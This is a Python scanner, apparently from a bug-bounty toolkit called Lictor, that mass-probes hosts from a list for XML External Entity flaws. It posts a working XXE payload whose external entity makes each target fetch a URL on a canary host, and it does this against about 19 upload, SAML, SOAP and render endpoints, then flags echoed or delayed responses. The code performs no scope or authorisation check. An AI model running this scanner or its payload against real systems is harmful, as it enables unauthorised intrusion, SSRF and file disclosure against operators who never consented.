#!/usr/bin/env python3
"""
patrol-xxe-candidates — scanner #63.

Hunts XML External Entity (XXE) candidates. Pattern: endpoint accepts XML
body and parses it with a permissive XML library that resolves external
entities → attacker can read local files, perform SSRF, DoS.

Bounty range: $5K-$25K typical; $25K+ for full file disclosure or SSRF chain.

Method (ETHICAL — only OOB callback to Lictor canary host, never reads files):
  1. For each host: probe XML-accepting endpoints with a benign external-entity
     payload that references our canary URL
  2. If canary receives a callback, XXE is confirmed
  3. Without canary: detect via response timing (OOB delay indicates fetch attempt)
     or response body change (sometimes the XML parser includes the fetched URL)

Usage:
  patrol-xxe-candidates.py --hosts targets.txt --canary lictor-xxe.example.com
"""
from __future__ import annotations
import argparse, json, time, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from pathlib import Path

UA = "Lictor-XXEPatrol/0.1 (+https://lictor-ai.com)"

ENDPOINTS = [
    "/api/v1/upload", "/api/upload", "/upload", "/api/import",
    "/api/v1/parse", "/parse", "/api/xml", "/xml",
    "/api/svg", "/svg", "/render", "/api/render",
    "/soap", "/wsdl", "/api/rss", "/feed",
    "/api/v1/saml/acs", "/saml/acs", "/api/sso",
]

XXE_PAYLOAD_TEMPLATE = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{canary}/lictor-xxe-{tag}"> ]>'
    '<foo>&xxe;</foo>'
)

@dataclass
class XXEFinding:
    host: str
    endpoint: str
    payload_tag: str
    request_status: int
    response_snippet: str
    classification: str   # "echoed_canary" / "delayed_response" / "no_signal"

def probe(host: str, endpoint: str, canary: str, timeout: int = 10):
    tag = f"{hash(host + endpoint) & 0xffffff:06x}"
    payload = XXE_PAYLOAD_TEMPLATE.format(canary=canary, tag=tag).encode()
    url = f"https://{host}{endpoint}"
    req = urllib.request.Request(url, data=payload,
                                  headers={"User-Agent": UA,
                                           "Content-Type": "application/xml"})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read(8192).decode("utf-8", "replace")
            return r.status, body, time.time() - t0, tag
    except urllib.error.HTTPError as e:
        try: b = e.read(8192).decode("utf-8", "replace")
        except: b = ""
        return e.code, b, time.time() - t0, tag
    except Exception:
        return None, None, time.time() - t0, tag

def classify(body: str | None, canary: str, tag: str, dt: float) -> str:
    if body and canary in body: return "echoed_canary"
    if body and f"lictor-xxe-{tag}" in body: return "echoed_canary"
    if dt > 6.0: return "delayed_response"  # OOB fetch likely happened
    return "no_signal"

def check_host(host: str, canary: str) -> list[XXEFinding]:
    out = []
    for ep in ENDPOINTS:
        time.sleep(0.5)
        status, body, dt, tag = probe(host, ep, canary)
        if status is None: continue
        cls = classify(body, canary, tag, dt)
        if cls in ("no_signal",): continue
        out.append(XXEFinding(
            host=host, endpoint=ep, payload_tag=tag,
            request_status=status,
            response_snippet=(body or "")[:200].replace("\n", " "),
            classification=cls))
    return out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", required=True)
    ap.add_argument("--canary", default="lictor-xxe-discovery.invalid",
                     help="Lictor-controlled DNS canary (re-use the SSRF canary)")
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--ledger", default="/Users/raffa/Lictor/v3/ledgers/xxe-candidates.jsonl")
    args = ap.parse_args()

    hosts = [h.strip() for h in Path(args.hosts).read_text().splitlines() if h.strip()]
    print(f"[+] XXE hunt: {len(hosts)} hosts × {len(ENDPOINTS)} endpoints")
    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)
    n = 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(check_host, h, args.canary): h for h in hosts}
        for i, fut in enumerate(as_completed(futures), 1):
            host = futures[fut]
            try: hits = fut.result()
            except Exception: continue
            for f in hits:
                ledger.write(json.dumps(asdict(f)) + "\n")
                ledger.flush()
                n += 1
                tag = "🔴" if f.classification == "echoed_canary" else "🟡"
                print(f"  [{i}/{len(hosts)}] {tag} {host}{f.endpoint}  {f.classification}")
            if i % 30 == 0: print(f"  [{i}/{len(hosts)}] scanning... {n} XXE candidates so far")
    print(f"\n[+] Done. {n} XXE candidates → {args.ledger}")
    print(f"[+] 🟡 delayed_response = needs canary log to confirm OOB fetch")

if __name__ == "__main__":
    main()
